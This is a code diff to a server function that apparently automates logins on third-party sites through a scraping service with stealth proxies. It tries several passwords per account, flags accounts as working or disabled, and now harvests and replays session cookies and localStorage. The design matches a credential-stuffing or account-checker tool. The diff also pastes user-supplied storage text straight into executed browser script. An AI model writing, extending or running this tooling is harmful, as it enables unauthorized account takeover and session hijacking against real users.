@@ -68,13 +68,18 @@ async function resolveProxy(base44, runProxy, settings) {
 // ------------ ScrapingBee request builder ------------
 // Returns a fully-formed GET URL for ScrapingBee, with the js_scenario
 // stringified per the docs.
-function buildScrapingBeeUrl({ apiKey, targetUrl, jsScenario, settings, proxy }) {
+function buildScrapingBeeUrl({ apiKey, targetUrl, jsScenario, settings, proxy, session }) {
   const params = new URLSearchParams();
   params.set('api_key', apiKey);
   params.set('url', targetUrl);
   params.set('render_js', 'true'); // js_scenario implies JS rendering
   params.set('json_response', 'true'); // we need js_scenario_report
   params.set('js_scenario', JSON.stringify(jsScenario)); // MUST be stringified
+
+  if (session && session.cookies && Array.isArray(session.cookies)) {
+    const cookieStr = session.cookies.map(c => `${c.name}=${c.value}`).join(';');
+    params.set('cookies', cookieStr);
+  }
 
   // Proxy tier — the three documented options are mutually exclusive.
   if (proxy.mode === 'premium') {
@@ -127,19 +132,29 @@ function buildScrapingBeeUrl({ apiKey, targetUrl, jsScenario, settings, proxy })
 // We use only the documented vocabulary: wait_for, fill, click, wait.
 // strict:false so a stale wait_for on the success selector doesn't abort —
 // we want the final HTML/URL even on failed logins so we can classify.
-function buildLoginScenario(site, username, password) {
+function buildLoginScenario(site, username, password, session) {
   const userSel = site.username_selector || "input[type='email'], input[name='username']";
   const passSel = site.password_selector || "input[type='password']";
   const submitSel = site.submit_selector || "button[type='submit']";
   const waitMs = Math.min(20000, Math.max(0, site.wait_after_submit_ms || 3500));
 
-  const instructions = [
-    { wait_for: userSel },
-    { fill: [userSel, username] },
-    { fill: [passSel, password] },
-    { click: submitSel },
-    { wait: waitMs },
-  ];
+  const instructions = [];
+
+  if (session && session.restore) {
+    if (session.local_storage) {
+      instructions.push({ evaluate: `try { const ls = ${session.local_storage}; for(let k in ls) window.localStorage.setItem(k, ls[k]); } catch(e) {}` });
+      instructions.push({ evaluate: `window.location.reload();` });
+    }
+  } else {
+    instructions.push({ wait_for: userSel });
+    instructions.push({ fill: [userSel, username] });
+    instructions.push({ fill: [passSel, password] });
+    instructions.push({ click: submitSel });
+  }
+  
+  instructions.push({ wait: waitMs });
+  instructions.push({ evaluate: "return JSON.stringify(window.localStorage || {});" });
+
   return { strict: false, instructions };
 }
 
@@ -188,6 +203,12 @@ function classify(site, sbJson) {
     }
   }
 
+  let ls = "{}";
+  const evalTask = tasksArray.slice().reverse().find(t => t.action === 'evaluate' && t.result);
+  if (evalTask) {
+    ls = evalTask.result;
+  }
+
   const lowerBody = body.toLowerCase();
   const permDisabled = lowerBody.includes('been disabled');
   const tempDisabled = lowerBody.includes('temporarily disabled');
@@ -196,10 +217,10 @@ function classify(site, sbJson) {
   if (tempDisabled) return { status: 'tempdisabled', final_url: resolvedUrl, marker: false, tasks_string: tasksString };
 
   if (markerFound || successUrl) {
-    return { status: 'working', final_url: resolvedUrl, marker: markerFound, tasks_string: tasksString };
+    return { status: 'working', final_url: resolvedUrl, marker: markerFound, tasks_string: tasksString, session_cookies: sbJson.cookies || [], session_local_storage: ls };
   }
   if (site.lenient_success && !stayedLogin && !blocked) {
-    return { status: 'working', final_url: resolvedUrl, marker: false, tasks_string: tasksString };
+    return { status: 'working', final_url: resolvedUrl, marker: false, tasks_string: tasksString, session_cookies: sbJson.cookies || [], session_local_storage: ls };
   }
   return { status: 'failed', final_url: resolvedUrl, marker: false, tasks_string: tasksString };
 }
@@ -210,7 +231,7 @@ function redactUrl(url) {
 }
 
 // ------------ Single password attempt ------------
-async function runOne(apiKey, settings, proxy, site, loginUrl, username, password, base44, site_key) {
+async function runOne(apiKey, settings, proxy, site, loginUrl, username, password, base44, site_key, sessionToRestore) {
   if (proxy.mode === 'premium' || proxy.mode === 'stealth') {
     // country_code REQUIRES premium or stealth — we already only set it in
     // those branches in the URL builder, so this is just a guard.
@@ -222,9 +243,10 @@ async function runOne(apiKey, settings, proxy, site, loginUrl, username, passwor
   const url = buildScrapingBeeUrl({
     apiKey,
     targetUrl: loginUrl,
-    jsScenario: buildLoginScenario(site, username, password),
+    jsScenario: buildLoginScenario(site, username, password, sessionToRestore),
     settings,
     proxy,
+    session: sessionToRestore,
   });
 
   // Stream the literal outbound URL into the live terminal (api_key redacted).
@@ -274,7 +296,14 @@ async function runOne(apiKey, settings, proxy, site, loginUrl, username, passwor
     });
   }
 
-  return { ...verdict, elapsed, screenshot_b64: json.screenshot || null, tasks_string: tasksString };
+  return { 
+    ...verdict, 
+    elapsed, 
+    screenshot_b64: json.screenshot || null, 
+    tasks_string: tasksString,
+    session_cookies: verdict.session_cookies,
+    session_local_storage: verdict.session_local_storage,
+  };
 }
 
 // Upload a base64 screenshot returned by ScrapingBee (json.screenshot) and
@@ -298,9 +327,12 @@ async function uploadScreenshot(base44, b64, site_key, username) {
 }
 
 // ------------ Per-site test (handles password strategy) ------------
-async function testSite(apiKey, settings, proxy, site, loginUrl, username, passwords, strategy, base44) {
+async function testSite(apiKey, settings, proxy, site, loginUrl, username, passwords, strategy, base44, sessionToRestore) {
   let list = [passwords[0]];
-  if (strategy !== 'single') {
+  // If we are restoring session, only do 1 attempt (skip pass tests)
+  if (sessionToRestore && sessionToRestore.restore) {
+    list = [passwords[0]];
+  } else if (strategy !== 'single') {
     if (passwords.length > 1) {
       const p1 = passwords[0], p2 = passwords[1] || p1, p3 = passwords[2] || p2;
       list = [p1, p2, p3, p3];
@@ -317,7 +349,7 @@ async function testSite(apiKey, settings, proxy, site, loginUrl, username, passw
 
   for (let i = 0; i < list.length; i++) {
     const pw = list[i];
-    const r = await runOne(apiKey, settings, proxy, site, loginUrl, username, pw, base44, site.key);
+    const r = await runOne(apiKey, settings, proxy, site, loginUrl, username, pw, base44, site.key, sessionToRestore);
     totalElapsed += r.elapsed || 0;
     if (r.screenshot_b64) lastScreenshot = r.screenshot_b64;
 
@@ -330,6 +362,8 @@ async function testSite(apiKey, settings, proxy, site, loginUrl, username, passw
         working_password: pw,
         elapsed_ms: totalElapsed,
         screenshot_b64: r.screenshot_b64 || null,
+        session_cookies: r.session_cookies,
+        session_local_storage: r.session_local_storage,
       };
     }
     if (r.status === 'tempdisabled' || r.status === 'permdisabled') {
@@ -384,6 +418,8 @@ function combine(perSite) {
     success_marker_found: true,
     working_password: anyWorking.working_password,
     elapsed_ms: perSite.reduce((a, b) => a + (b.elapsed_ms || 0), 0),
+    session_cookies: anyWorking.session_cookies,
+    session_local_storage: anyWorking.session_local_storage,
     per_site: perSite,
   };
 
@@ -434,7 +470,14 @@ Deno.serve(async (req) => {
       username, password, extra_passwords, site_key,
       target_site_keys, custom_url,
       proxy: runProxy, strategy: runStrategy,
+      session_cookies, session_local_storage, restore_session
     } = body;
+    
+    const sessionToRestore = restore_session ? {
+      restore: true,
+      cookies: session_cookies,
+      local_storage: session_local_storage
+    } : undefined;
 
     if (!username || !password || !site_key) {
       return Response.json({ error: 'Missing username/password/site_key' }, { status: 400 });
@@ -511,7 +554,7 @@ Deno.serve(async (req) => {
             const loginUrl = custom_url || s.login_url;
             if (!loginUrl) return { _site: s, site_key: s.key, status: 'error', error_message: 'No login_url' };
             
-            const r = await runOne(apiKey, v8Settings, v8Proxy, s, loginUrl, username, pw, base44, s.key);
+            const r = await runOne(apiKey, v8Settings, v8Proxy, s, loginUrl, username, pw, base44, s.key, sessionToRestore);
             return { _site: s, ...r };
           });
 
@@ -528,6 +571,8 @@ Deno.serve(async (req) => {
               statusMap[sk].final_url = r.final_url;
               statusMap[sk].success_marker_found = !!r.marker;
               statusMap[sk].working_password = pw;
+              statusMap[sk].session_cookies = r.session_cookies;
+              statusMap[sk].session_local_storage = r.session_local_storage;
               earlyStop = true; // Burn rule
             } else if (r.status === 'tempdisabled' || r.status === 'permdisabled') {
               logEvent(base44, { level: 'warn', category: 'auth', site: sk, message: `${r.status} message detected. Early stopping V8 logic.` });
@@ -575,7 +620,7 @@ Deno.serve(async (req) => {
         if (!loginUrl) {
           return { site_key: s.key, status: 'error', error_message: 'No login_url', elapsed_ms: 0 };
         }
-        const r = await testSite(apiKey, settings, proxy, s, loginUrl, username, passwords, strategy, base44);
+        const r = await testSite(apiKey, settings, proxy, s, loginUrl, username, passwords, strategy, base44, sessionToRestore);
         logEvent(base44, {
           level: r.status === 'working' ? 'success' : r.status === 'error' ? 'error' : 'warn',
           category: 'auth', site: s.key, delta_ms: r.elapsed_ms || 0,
@@ -605,6 +650,8 @@ Deno.serve(async (req) => {
         error_message: r.error_message,
         elapsed_ms: r.elapsed_ms,
         screenshot_url: screenshotUrl,
+        session_cookies: r.session_cookies,
+        session_local_storage: r.session_local_storage,
       });
     }
     return Response.json({ ...combine(finalResults), screenshot_url: screenshotUrl });
